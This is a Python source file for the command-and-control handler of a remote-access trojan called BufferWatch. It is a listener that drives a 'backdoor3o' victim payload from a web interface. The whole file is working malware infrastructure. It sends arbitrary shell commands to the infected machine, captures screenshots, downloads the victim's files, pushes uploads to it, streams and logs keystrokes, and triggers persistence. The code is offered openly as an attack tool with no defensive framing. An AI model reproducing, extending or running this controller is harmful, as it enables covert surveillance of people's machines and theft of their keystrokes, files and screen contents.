"""
BufferWatch – C2 Handler
Manages the raw TCP socket to the victim (backdoor3o payload).
Protocol mirrors server.py exactly.

NOTE: This module is imported AFTER eventlet.monkey_patch() in app.py,
so all socket/threading calls are green-patched automatically.

FIX: Keylog data ([KEYLOG] lines) and command output share the same TCP
socket.  Previously, a background reader consumed ALL data, starving
command handlers.  Now we use:
  1. recv_line_filtered() – reads lines and transparently routes [KEYLOG]
     lines to the web UI, returning only real command output.
  2. _sock_lock – an eventlet Semaphore that serializes socket access
     between the idle keylog reader and command handlers.
  3. _idle_keylog_reader() – a background greenlet that captures keylog
     data ONLY when no command is in progress.
"""

import eventlet
import socket
import os
import time
from datetime import datetime

# ── Directories ──────────────────────────────────────────────────────
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SCREENSHOT_DIR = os.path.join(BASE_DIR, "screenshots")
DOWNLOAD_DIR   = os.path.join(BASE_DIR, "downloads")
UPLOAD_DIR     = os.path.join(BASE_DIR, "uploads")
KEYLOG_DIR     = os.path.join(BASE_DIR, "keylogs")

for d in [SCREENSHOT_DIR, DOWNLOAD_DIR, UPLOAD_DIR, KEYLOG_DIR]:
    os.makedirs(d, exist_ok=True)

BUFFER_SIZE = 4096

# ── Global state ─────────────────────────────────────────────────────
client_socket = None
client_address = None
is_connected = False
server_socket = None
socketio_ref = None          # will be set by app.py
keylog_active = False
_listener_running = False
_sock_lock = eventlet.semaphore.Semaphore(1)   # serialise socket reads
_keylog_file_path = None


def _log(msg):
    """Print a timestamped debug message to the server console."""
    ts = datetime.now().strftime("%H:%M:%S")
    print(f"  [C2 {ts}] {msg}", flush=True)


def set_socketio(sio):
    """Store a reference to the Flask-SocketIO instance."""
    global socketio_ref
    socketio_ref = sio


def emit_event(event, data):
    """Broadcast a SocketIO event to all web clients."""
    if socketio_ref:
        socketio_ref.emit(event, data)


def _write_keylog(text):
    """Append keylog text to the current log file."""
    if _keylog_file_path:
        try:
            with open(_keylog_file_path, "a", errors="ignore") as f:
                f.write(text)
        except Exception:
            pass


# ── Low-level recv helpers ───────────────────────────────────────────

def recv_line_filtered(sock, timeout=5):
    """
    Read bytes until '\\n'.  Returns the decoded string (no newline).
    [KEYLOG] lines are transparently emitted to the web UI and written
    to disk – they are NEVER returned to the caller.  This keeps all
    command-response handlers working even when the keylogger is active.
    """
    deadline = time.time() + timeout

    while True:
        remaining = deadline - time.time()
        if remaining <= 0:
            return None

        data = b""
        try:
            sock.settimeout(remaining)
            while True:
                ch = sock.recv(1)
                if not ch:
                    return None
                if ch == b"\n":
                    break
                data += ch
        except socket.timeout:
            return None
        except Exception:
            return None
        finally:
            try:
                sock.settimeout(None)
            except Exception:
                pass

        text = data.decode(errors="ignore")

        # ── Filter keylog lines ──────────────────────────────────
        if text.startswith("[KEYLOG]"):
            emit_event("keylog_update", {"data": text + "\n"})
            _write_keylog(text + "\n")
            # Reset deadline – keylog lines don't count towards timeout
            deadline = time.time() + max(remaining, 1.0)
            continue

        return text


def recv_exact(sock, length, timeout=30):
    """Receive exactly *length* bytes."""
    sock.settimeout(timeout)
    data = b""
    try:
        while len(data) < length:
            try:
                chunk = sock.recv(min(BUFFER_SIZE, length - len(data)))
                if not chunk:
                    return None
                data += chunk
            except socket.timeout:
                return None
            except Exception:
                return None
    finally:
        try:
            sock.settimeout(None)
        except Exception:
            pass
    return data


def drain_until_empty_line(sock):
    """Consume lines until an empty line (just '\\n') is received."""
    while True:
        line = recv_line_filtered(sock, timeout=1)
        if line is None or line == "":
            break


# ── Idle keylog reader ───────────────────────────────────────────────

def _idle_keylog_reader():
    """
    Background greenlet that reads [KEYLOG] lines from the socket when
    NO command is currently being processed.  It acquires _sock_lock
    non-blocking so it never conflicts with send_command().
    """
    global is_connected, keylog_active

    _log("Idle keylog reader started")
    while is_connected and keylog_active:
        # Try to acquire the lock without blocking
        acquired = _sock_lock.acquire(blocking=False)
        if not acquired:
            eventlet.sleep(0.15)
            continue
        try:
            if not client_socket or not is_connected:
                break
            line = recv_line_filtered(client_socket, timeout=0.5)
            # Any non-keylog data that arrives during idle is unexpected
            if line is not None and line != "":
                _log(f"Idle data (unexpected): {line[:80]}")
        except Exception:
            pass
        finally:
            _sock_lock.release()
        eventlet.sleep(0.05)

    _log("Idle keylog reader stopped")


# ── Command handlers ─────────────────────────────────────────────────

def handle_screenshot(sock, target_id):
    """Receive a BMP screenshot from the payload."""
    _log("Waiting for screenshot size...")
    size_line = recv_line_filtered(sock, timeout=10)
    if not size_line:
        _log("Screenshot: no size received")
        emit_event("command_output", {"output": "[!] Screenshot: no size received"})
        return
    try:
        file_size = int(size_line.strip())
    except ValueError:
        _log(f"Screenshot: invalid size '{size_line}'")
        emit_event("command_output", {"output": f"[!] Screenshot: invalid size '{size_line}'"})
        return

    _log(f"Receiving screenshot: {file_size} bytes")
    emit_event("command_output", {"output": f"[*] Receiving screenshot ({file_size} bytes)..."})
    bmp_data = recv_exact(sock, file_size, timeout=60)
    if not bmp_data:
        _log("Screenshot: incomplete data")
        emit_event("command_output", {"output": "[!] Screenshot: incomplete data"})
        return

    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"screenshot_{target_id}_{ts}.bmp"
    filepath = os.path.join(SCREENSHOT_DIR, filename)
    with open(filepath, "wb") as f:
        f.write(bmp_data)

    _log(f"Screenshot saved: {filename}")
    emit_event("command_output", {"output": f"[+] Screenshot saved: {filename}"})
    emit_event("screenshot_ready", {"url": f"/screenshots/{filename}", "filename": filename})
    # Screenshot uses 'continue' in payload → no trailing \n
    drain_until_empty_line(sock)


def handle_download(sock, target_id, remote_filename):
    """Receive a file from the victim."""
    _log(f"Downloading: {remote_filename}")
    size_line = recv_line_filtered(sock, timeout=10)
    if not size_line:
        _log("Download: no size received")
        emit_event("command_output", {"output": "[!] Download: no size received"})
        return
    try:
        file_size = int(size_line.strip())
    except ValueError:
        _log(f"Download: invalid size '{size_line}'")
        emit_event("command_output", {"output": f"[!] Download: invalid size '{size_line}'"})
        return
    if file_size == 0:
        _log("File not found on target")
        emit_event("command_output", {"output": "[!] File not found on target"})
        return

    _log(f"Download size: {file_size} bytes")
    emit_event("command_output", {"output": f"[*] Downloading {file_size} bytes..."})
    file_data = recv_exact(sock, file_size, timeout=60)
    if not file_data:
        _log("Download: incomplete data")
        emit_event("command_output", {"output": "[!] Download: incomplete data"})
        return

    safe_name = remote_filename.replace(":", "_").replace("\\", "_").replace("/", "_")
    save_path = os.path.join(DOWNLOAD_DIR, safe_name)
    with open(save_path, "wb") as f:
        f.write(file_data)

    _log(f"Downloaded: {save_path}")
    emit_event("command_output", {"output": f"[+] Downloaded to: downloads/{safe_name}"})
    drain_until_empty_line(sock)


def handle_upload(sock, target_id, local_filename):
    """Upload a file from uploads/ to the victim."""
    local_path = os.path.join(UPLOAD_DIR, local_filename)
    if not os.path.isfile(local_path):
        _log(f"Upload: file not found '{local_filename}'")
        emit_event("command_output", {"output": f"[!] Upload: file not found '{local_filename}'"})
        return

    _log(f"Uploading: {local_filename}")
    # The payload expects "upload <filename>" as the command
    # Then it waits for a size line, then the file data
    sock.sendall(f"upload {local_filename}\n".encode())
    file_size = os.path.getsize(local_path)
    sock.sendall(f"{file_size}\n".encode())
    time.sleep(0.2)

    with open(local_path, "rb") as f:
        while True:
            chunk = f.read(BUFFER_SIZE)
            if not chunk:
                break
            sock.sendall(chunk)
            time.sleep(0.01)

    # Payload sends "Upload successful\n" + trailing \n
    resp = recv_line_filtered(sock, timeout=10)
    if resp:
        _log(f"Upload response: {resp}")
        emit_event("command_output", {"output": f"[+] {resp}"})
    drain_until_empty_line(sock)


def handle_keylogger(sock, target_id):
    """Start the keylogger on the victim and begin streaming."""
    global keylog_active, _keylog_file_path
    _log("Starting keylogger...")

    # Payload sends "Keylogger started!\n" then trailing \n
    started = recv_line_filtered(sock, timeout=5)
    if started:
        _log(f"Keylogger: {started}")
        emit_event("command_output", {"output": f"[+] {started}"})
    drain_until_empty_line(sock)

    _keylog_file_path = os.path.join(
        KEYLOG_DIR,
        f"keylog_{target_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")
    keylog_active = True
    emit_event("command_output", {"output": "[*] Keylogger streaming started..."})

    # Start the idle reader that will capture [KEYLOG] lines
    # between commands (when no command handler holds _sock_lock)
    eventlet.spawn(_idle_keylog_reader)


def handle_persist(sock):
    """Send persist and receive the confirmation."""
    _log("Waiting for persist response...")
    resp = recv_line_filtered(sock, timeout=10)
    if resp:
        _log(f"Persist: {resp}")
        emit_event("command_output", {"output": f"[+] {resp}"})
    drain_until_empty_line(sock)


def handle_generic_command(sock, cmd):
    """Send a shell command and read output until terminating empty line."""
    _log(f"Sending generic command: {cmd}")
    sock.sendall(cmd.encode() + b"\n")
    output_lines = []
    while True:
        line = recv_line_filtered(sock, timeout=5)
        if line is None:
            break
        if line == "":
            break
        output_lines.append(line)
    text = "\n".join(output_lines) if output_lines else "(no output)"
    _log(f"Command output: {len(output_lines)} lines")
    emit_event("command_output", {"output": text})


# ── Public API called by app.py ──────────────────────────────────────

def send_command(cmd: str):
    """Route a command string coming from the web UI."""
    global client_socket, is_connected, keylog_active

    if not client_socket or not is_connected:
        emit_event("command_output", {"output": "[!] No victim connected."})
        return

    sock = client_socket
    target_id = f"{client_address[0]}_{client_address[1]}" if client_address else "unknown"
    cmd = cmd.strip()
    if not cmd:
        return

    _log(f">>> Command: {cmd}")

    # Acquire lock so the idle keylog reader pauses
    _sock_lock.acquire()
    try:
        if cmd.lower() in ("exit", "quit", "q"):
            sock.sendall(b"q\n")
            sock.close()
            is_connected = False
            keylog_active = False
            client_socket = None
            emit_event("status_update", {"status": "disconnected", "target": ""})
            emit_event("command_output", {"output": "[*] Session closed."})
            _log("Session closed by user")
            return

        if cmd == "screenshot":
            sock.sendall(b"screenshot\n")
            handle_screenshot(sock, target_id)

        elif cmd.startswith("download "):
            filename = cmd[9:].strip()
            sock.sendall(cmd.encode() + b"\n")
            handle_download(sock, target_id, filename)

        elif cmd.startswith("upload "):
            local_file = cmd[7:].strip()
            handle_upload(sock, target_id, local_file)

        elif cmd == "keylog_start":
            sock.sendall(b"keylog_start\n")
            handle_keylogger(sock, target_id)

        elif cmd == "keylog_stop":
            keylog_active = False
            emit_event("command_output", {"output": "[*] Keylog capture stopped."})

        elif cmd == "persist":
            sock.sendall(b"persist\n")
            handle_persist(sock)

        else:
            handle_generic_command(sock, cmd)

    except (socket.error, ConnectionResetError, BrokenPipeError, OSError) as e:
        _log(f"Connection lost: {e}")
        is_connected = False
        keylog_active = False
        emit_event("status_update", {"status": "disconnected", "target": ""})
        emit_event("command_output", {"output": f"[!] Connection lost: {e}"})
    finally:
        _sock_lock.release()


# ── TCP Listener ─────────────────────────────────────────────────────

def start_listener(host="0.0.0.0", port=50005):
    """
    TCP accept loop. Called as a socketio.start_background_task()
    so it runs inside the eventlet hub properly.
    """
    global client_socket, client_address, is_connected, server_socket
    global _listener_running, keylog_active

    if _listener_running:
        _log("Listener already running, skipping.")
        return

    _listener_running = True

    try:
        server_socket = eventlet.listen((host, port))
    except Exception as e:
        _log(f"FATAL: Could not bind to {host}:{port} -> {e}")
        emit_event("command_output", {"output": f"[!] Cannot bind to {host}:{port}: {e}"})
        _listener_running = False
        return

    _log(f"TCP listener ACTIVE on {host}:{port}")
    _log("Waiting for victim connections...")
    emit_event("command_output", {"output": f"[*] TCP listener started on {host}:{port}"})

    while True:
        try:
            client, addr = server_socket.accept()
            _log(f"!!! CONNECTION ATTEMPT RECEIVED from {addr[0]}:{addr[1]}")

            # Close any existing session
            if client_socket and is_connected:
                try:
                    client_socket.close()
                except Exception:
                    pass
                _log("Closed previous victim session")

            # Reset keylog state for new session
            keylog_active = False

            client_socket = client
            client_address = addr
            is_connected = True
            target_id = f"{addr[0]}:{addr[1]}"

            # Read initial banner
            _log("Attempting to read victim banner...")
            try:
                client.settimeout(2.0)
                banner_data = client.recv(1024)
                banner_text = banner_data.decode(errors="ignore").strip()
                if banner_text:
                    _log(f"Banner received: {banner_text}")
                client.settimeout(None)
            except Exception as e:
                _log(f"Banner read skipped/failed: {e}")
                banner_text = ""
                client.settimeout(None)

            emit_event("status_update", {"status": "connected", "target": target_id})
            msg = f"[+] Victim connected: {target_id}"
            if banner_text:
                msg += f" (Banner: {banner_text})"
            emit_event("command_output", {"output": msg})
            _log("Session fully established and GUI notified.")

        except OSError as e:
            _log(f"Accept loop OSError: {e}")
            break
        except Exception as e:
            _log(f"Accept error: {e}")
            emit_event("command_output", {"output": f"[!] Accept error: {e}"})
            eventlet.sleep(1)


def get_status():
    """Return current connection state."""
    if is_connected and client_address:
        return {"status": "connected", "target": f"{client_address[0]}:{client_address[1]}"}
    return {"status": "disconnected", "target": ""}
